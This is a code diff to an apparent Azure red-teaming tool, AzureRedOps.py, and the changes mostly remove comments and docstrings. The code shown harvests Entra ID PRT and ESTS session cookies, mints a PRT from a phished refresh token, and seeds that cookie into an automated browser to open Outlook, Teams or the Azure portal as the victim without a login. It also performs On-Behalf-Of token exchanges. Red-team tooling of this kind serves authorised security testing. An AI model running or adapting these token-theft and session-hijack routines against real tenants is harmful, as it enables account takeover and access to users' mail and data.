@@ -8,7 +8,6 @@
 # (AzureRedOps) $ python3 AzureRedOps.py
 # (AzureRedOps) $ pip install -r requirements.txt
 
-
 import os
 import re
 import jwt
@@ -37,14 +36,9 @@ class AzureRedOps:
     DEFAULT_SCOPE = "openid offline_access"
     DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
     DEFAULT_ENDPOINT = "microsoftonline.com"
-    # Playwright engine used by the browser flows. Firefox is the default: it is
-    # the most reliable headed engine under WSLg. Override with -br/--browser.
     DEFAULT_BROWSER = "firefox"
     SUPPORTED_BROWSERS = ["firefox", "chromium", "webkit"]
-    # Microsoft Office - a FOCI (Family of Client IDs) client, so its refresh
-    # tokens can be redeemed for sibling first-party resources (Outlook, Teams...).
     DEFAULT_FOCI_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-    # Friendly web-app targets for the browser SSO flow -> (token resource, web URL).
     WEB_APP_TARGETS = {
         "outlook":    {"resource": "https://outlook.office365.com",     "url": "https://outlook.office.com/mail/"},
         "office":     {"resource": "https://www.office.com",            "url": "https://www.office.com/"},
@@ -54,13 +48,7 @@ class AzureRedOps:
         "portal":     {"resource": "https://management.core.windows.net","url": "https://portal.azure.com/"},
         "graph":      {"resource": "https://graph.microsoft.com",       "url": "https://developer.microsoft.com/en-us/graph/graph-explorer"},
     }
-    # Cookies worth harvesting from a completed browser SSO session. The PRT
-    # cookie (x-ms-RefreshTokenCredential) can be replayed later with -prt; the
-    # ESTS* cookies are the authenticated ESTS session and can be reused as-is.
     SSO_COOKIES = ["x-ms-RefreshTokenCredential", "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie"]
-    # First-party Office landing client used to warm up an ESTS session from the
-    # PRT cookie in a top-level (first-party) context before opening the target
-    # app. Matches the authorize flow seen in the wild (office.com/landingv2).
     SSO_WARMUP_CLIENT = "4765445b-32c6-49b0-83e6-1d93765276ca"
     SSO_WARMUP_REDIRECT = "https://www.office.com/landingv2"
 
@@ -259,8 +247,6 @@ class AzureRedOps:
             print(f"{self.w("Error")}{str(e)}")
             exit()
 
-    ### Activities
-
     def save_azure_token_to_file(self, token, refresh_token, tenant, name):
         data = {}
         try:
@@ -422,15 +408,6 @@ class AzureRedOps:
             self.save_credentials(response["access_token"], response["refresh_token"])
 
     def is_wsl(self):
-        """Detect WSL/WSLg so we can harden the headed browser launch.
-
-        A headed browser on WSL is the source of the 'empty window that freezes
-        the whole machine' symptom: WSLg exposes a virtualized GPU (/dev/dxg via
-        the d3d12 Mesa driver) that the browser's GPU/compositor process tries to
-        use, and the default /dev/shm inside the WSL VM is tiny. The two combine
-        to spin the GPU process while nothing ever paints, ballooning the VM
-        until the Windows host thrashes. Disabling the GPU and the /dev/shm
-        transport avoids it entirely (see launch_browser)."""
         if os.environ.get("WSL_DISTRO_NAME") or os.environ.get("WSL_INTEROP"):
             return True
         try:
@@ -440,14 +417,6 @@ class AzureRedOps:
             return False
 
     def launch_browser(self, p):
-        """Launch a headed browser (engine chosen by -br/--browser, default
-        Firefox) hardened for the current environment.
-
-        Firefox is the default because it is the most reliable headed engine
-        under WSLg. Whatever the engine, on WSL we disable hardware acceleration
-        so the window paints on the virtualized GPU instead of hanging blank and
-        wedging the host. Rendering falls back to CPU (software) rasterization,
-        so the login page stays fully visible and interactive."""
         wsl = self.is_wsl()
         engine = (self.browser or self.DEFAULT_BROWSER).lower()
         if engine not in self.SUPPORTED_BROWSERS:
@@ -462,18 +431,10 @@ class AzureRedOps:
             return p.chromium.launch(headless=False, args=args)
         if engine == "webkit":
             return p.webkit.launch(headless=False)
-        # Firefox (default). Force software rendering under WSL; WSLg's virtual
-        # GPU hangs Firefox's WebRender compositor otherwise.
         prefs = {"gfx.webrender.force-disabled": True, "layers.acceleration.disabled": True} if wsl else {}
         return p.firefox.launch(headless=False, firefox_user_prefs=prefs)
 
     def dump_sso_cookies(self, cookies):
-        """Print any PRT / ESTS session cookie present in a browser cookie list
-        so an issued PRT (or the ESTS session) can be reused afterward.
-
-        `cookies` is the list returned by context.cookies(). We print the PRT
-        cookie value with a ready-to-paste -prt hint so the next run can seed it
-        for automatic SSO, and echo the ESTS* session cookies for reuse."""
         found = [c for c in (cookies or []) if c.get("name") in self.SSO_COOKIES]
         if not found:
             print(f"{self.w("Hint")}No PRT/ESTS session cookie was present in this session (nothing to reuse).")
@@ -501,9 +462,6 @@ class AzureRedOps:
                 context = browser.new_context(record_har_path=session_file_path)
                 page = context.new_page()
 
-                # The Microsoft login page long-polls (telemetry/websockets) so
-                # 'networkidle' never fires and page.goto blocks on a blank window
-                # until it times out. Wait for the DOM instead.
                 page.goto(f"https://login.{self.microsoft_endpoint}", wait_until="domcontentloaded")
                 time.sleep(delay)
 
@@ -512,8 +470,6 @@ class AzureRedOps:
                     page.goto(u, wait_until="domcontentloaded")
                     time.sleep(10)
 
-                # Surface any PRT/ESTS session cookie issued during the login so
-                # it can be reused (seed with -prt) before we tear down the context.
                 try:
                     self.dump_sso_cookies(context.cookies())
                 except Exception as e:
@@ -593,13 +549,6 @@ class AzureRedOps:
                 return response
 
     def obo(self, assertion, tenant, appid, secret, scope=None):
-        """OAuth 2.0 On-Behalf-Of (jwt-bearer) grant.
-
-        Exchange an already-issued access token (the 'assertion') for a brand new
-        token scoped to a downstream resource. The confidential client identified
-        by appid/secret must be the audience ('aud') of the assertion token,
-        otherwise Entra ID rejects the exchange (AADSTS500131 / AADSTS50013).
-        """
         if tenant is None:
             tenant = "common"
         if scope is None:
@@ -632,26 +581,14 @@ class AzureRedOps:
             self.save_credentials(response["access_token"], response.get("refresh_token"))
 
     def resolve_web_target(self, target):
-        """Map a friendly target name (outlook, teams, ...) or a raw URL list to a
-        (resource, [urls]) tuple used by the browser SSO flow."""
         if target is None:
             target = "outlook"
         preset = self.WEB_APP_TARGETS.get(target.lower())
         if preset:
             return preset["resource"], [preset["url"]]
-        # Not a preset: treat as one or more raw URLs. The resource falls back to
-        # the current audience so the minted token still matches a usable target.
         return self.default_audience, [u.strip() for u in target.split(",") if u.strip()]
 
     def mint_prt(self, refresh_token, tenant, appid=None):
-        """Mint a PRT + session key from a refresh token (device registration ->
-        PRT). Stops short of the cookie so the caller can derive it with a fresh
-        nonce right before the browser navigates.
-
-        `appid` is the client the refresh token was issued to (the -app used to
-        phish it); the chain redeems the RT with its own client, which is what
-        actually works. Returns (PRTManager, prt, session_key_bytes) or
-        (None, None, None) on failure."""
         from includes.PRT import PRTManager, PRTError
         try:
             mgr = PRTManager(
@@ -675,7 +612,6 @@ class AzureRedOps:
         return mgr, result["prt"], result["session_key"]
 
     def _derive_and_show_cookie(self, mgr, prt, session_key, quiet=False):
-        """Derive a fresh PRT cookie (fresh nonce) and print it for reuse."""
         try:
             cookie = mgr.derive_cookie(prt, session_key)
         except Exception as e:
@@ -687,11 +623,6 @@ class AzureRedOps:
         return cookie
 
     def _seed_prt_cookie(self, context, cookie):
-        """Seed (or overwrite) the x-ms-RefreshTokenCredential cookie.
-
-        sameSite=None is essential: the Office/Outlook SPA does its silent
-        sign-in via a hidden iframe to login.microsoftonline.com (a third-party
-        context) where a Lax/unset cookie is not sent."""
         context.add_cookies([{
             "name": "x-ms-RefreshTokenCredential",
             "value": cookie,
@@ -701,8 +632,6 @@ class AzureRedOps:
             "secure": True,
             "sameSite": "None",
         }])
-        # Browsers silently drop cookies over ~4 KB; confirm it actually landed so
-        # a dropped cookie doesn't masquerade as an ESTS rejection.
         try:
             stored = [c for c in context.cookies(f"https://login.{self.microsoft_endpoint}/")
                       if c.get("name") == "x-ms-RefreshTokenCredential"]
@@ -712,8 +641,6 @@ class AzureRedOps:
             pass
 
     def _extract_ests_error(self, page):
-        """Pull an AADSTS error out of the ESTS login page so the operator sees
-        *why* SSO failed (stale nonce vs MFA vs compliant-device CA)."""
         try:
             html = page.content()
         except Exception:
@@ -738,8 +665,6 @@ class AzureRedOps:
         return url
 
     def _warmup_sso(self, page, tenant):
-        """Consume the PRT cookie via a top-level ESTS /authorize navigation so
-        ESTSAUTH is minted first-party. Returns (success, landed_url, error)."""
         try:
             page.goto(self._authorize_url(tenant), wait_until="domcontentloaded")
             time.sleep(6)
@@ -751,9 +676,6 @@ class AzureRedOps:
             return False, None, str(e)
 
     def _diagnose_sso(self, page, tenant):
-        """Probe /authorize with prompt=none so ESTS returns an explicit AADSTS
-        reason (silent-auth failed / MFA / device compliance) instead of a bare
-        login form -- turns 'still on login page' into an actionable cause."""
         try:
             page.goto(self._authorize_url(tenant, prompt_none=True), wait_until="domcontentloaded")
             time.sleep(3)
@@ -764,33 +686,12 @@ class AzureRedOps:
             return str(e)
 
     def browser_sso(self, refresh_token, tenant, appid, target, prt_cookie=None, version="v2.0", keep=False, auto_prt=False):
-        """Open a browser that is already authenticated as the user (SSO).
-
-        The goal is "open the browser and land straight in the web app" -- no
-        manual login. There are three ways the browser gets its session, in order
-        of preference:
-
-        1. -aprt/--auto-prt: mint a PRT cookie from the refresh token on the fly
-           (device registration -> PRT -> x-ms-RefreshTokenCredential) and seed
-           it. This is the streamlined flow: no token exchange first, the browser
-           opens seeded and ESTS completes SSO automatically.
-        2. -prt/--prt-cookie: seed a PRT cookie you already have (e.g. from a
-           previous -aprt run or a compromised host).
-        3. Neither: fall back to converting the refresh token to a resource-scoped
-           API token (printed + saved) and open the target for a manual login.
-
-        Whatever the path, any PRT/ESTS session cookie issued in the browser is
-        harvested and printed at the end for reuse.
-        """
         if tenant is None:
             tenant = "common"
         resource, urls = self.resolve_web_target(target)
         delay = 600
         session_file_path = "session.har"
 
-        # Path 1: auto-mint a PRT so a fresh browser lands authenticated. We only
-        # do device-reg + PRT here; the cookie is derived later (fresh nonce)
-        # right before the browser navigates.
         mgr = prt = session_key = None
         if auto_prt and not prt_cookie:
             print(f"{self.w("Action")}Auto-PRT: minting a PRT from the refresh token.")
@@ -798,10 +699,6 @@ class AzureRedOps:
             if not mgr:
                 print(f"{self.w("Hint")}Auto-PRT failed; opening the browser without a seeded PRT cookie -- you may need to log in manually.")
 
-        # Path 3: no PRT cookie -> convert the refresh token to a resource-scoped
-        # API token (printed + saved) so the run is still useful. Skipped when
-        # -aprt was attempted: that chain already consumes/rotates the refresh
-        # token, so replaying the original here would just fail with AADSTS70000.
         if not prt_cookie and not auto_prt:
             print(f"{self.w("Action")}Converting the refresh token to a '{resource}' scoped token.")
             if version == "v2.0":
@@ -833,11 +730,6 @@ class AzureRedOps:
                 page = context.new_page()
 
                 if can_seed:
-                    # Derive the cookie now (fresh nonce) if we minted a PRT, then
-                    # consume it via a top-level ESTS /authorize navigation so
-                    # ESTSAUTH is minted first-party. Retry once with a new nonce
-                    # if ESTS stays on the login page (a stale request_nonce is the
-                    # most common transient cause).
                     if mgr is not None and not prt_cookie:
                         prt_cookie = self._derive_and_show_cookie(mgr, prt, session_key)
 
@@ -868,24 +760,12 @@ class AzureRedOps:
                 for u in urls:
                     print(f"{self.w("Action")}Navigating to {u}.")
                     try:
-                        # OWA/Teams long-poll, so 'networkidle' never fires; wait for the DOM instead.
                         page.goto(u, wait_until="domcontentloaded")
                     except Exception as e:
                         print(f"{self.w("Error")}Could not open {u}: {str(e)}")
                         break
                     time.sleep(5)
                 print(f"{self.w("Action")}Browser is live as the user. Close the window when done (auto-closes after {delay}s).")
-                # Poll the context for PRT/ESTS cookies while the session is live so
-                # the latest issued PRT is captured even if the operator closes the
-                # window before the timeout (cookies are unreadable once torn down).
-                #
-                # Resume as soon as the operator closes the window. We can't rely on
-                # browser.is_connected() alone: with a headed browser (notably
-                # Firefox) closing the window closes the *page* but leaves the
-                # browser process connected, so is_connected() stays True. Reading
-                # cookies round-trips and flushes the page 'close' event, after
-                # which context.pages is empty -> we break instead of hanging out
-                # the full timeout.
                 sso_cookies = []
                 waited = 0
                 while browser.is_connected() and waited < delay:
@@ -894,9 +774,9 @@ class AzureRedOps:
                         if snapshot:
                             sso_cookies = snapshot
                     except Exception:
-                        break  # context/browser torn down
+                        break
                     if not context.pages:
-                        break  # operator closed the window(s)
+                        break
                     time.sleep(3)
                     waited += 3
                 if browser.is_connected():
@@ -905,7 +785,6 @@ class AzureRedOps:
                         browser.close()
                     except Exception:
                         pass
-                # Surface the issued PRT/ESTS cookies so they can be reused later.
                 self.dump_sso_cookies(sso_cookies)
         except Exception as e:
             print(f"{self.w("Error")}{str(e)}")
@@ -1027,8 +906,6 @@ class AzureRedOps:
                             print(app.get(item))
                     else:
                         self.print_data(app, 48)
-
-    # Graph
 
     def graph_self(self, token):
         headers = {}
@@ -1240,7 +1117,6 @@ class AzureRedOps:
                                     print(f"{self.w("Success")}{response.get("displayName")} ({response.get("appId")}).")
                                     for client in client_url.get("redirectUris"):
                                         print(f"{self.w("Success")}Url Redirection set to {client}.")
-
 
 def main():
     parser = argparse.ArgumentParser(description=f"Azure RedOps v{VERSION} - A Swiss Army tool for Azure red teaming.")
@@ -1630,7 +1506,6 @@ def main():
 
     else:
         print(f"{app.w("Error")}Invalid activity provided.")
-
 
 if __name__ == "__main__":
     main()
